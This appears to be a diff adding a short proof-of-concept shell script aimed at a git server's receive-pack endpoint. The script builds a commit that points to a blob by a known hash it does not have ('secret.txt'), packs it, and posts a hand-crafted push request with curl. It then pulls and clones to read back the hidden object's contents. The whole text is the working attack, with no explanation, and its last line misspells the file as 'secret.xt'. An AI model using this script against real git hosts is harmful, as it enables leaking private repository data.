@@ -1,0 +1,11 @@
+git clone
+git update-index --add --cacheinfo 100644 4f9486f4498bc353b1e9a3ac790993eea4229f2e secret.txt
+TREE=$(git write-tree --missing-ok)
+COMMIT=$(echo "add secret.txt" | git commit-tree $TREE)
+(echo $TREE; echo $COMMIT) | git pack-objects --stdout > pack
+echo -n "00670000000000000000000000000000000000000000 $COMMIT refs/heads/master0000" > update-ref
+cat update-ref pack > payload
+curl --data-binary @payload -H "Content-type: application/x-git-receive-pack-request" $URL/git-receive-pack -i
+git pull
+git clone
+cat secret.xt
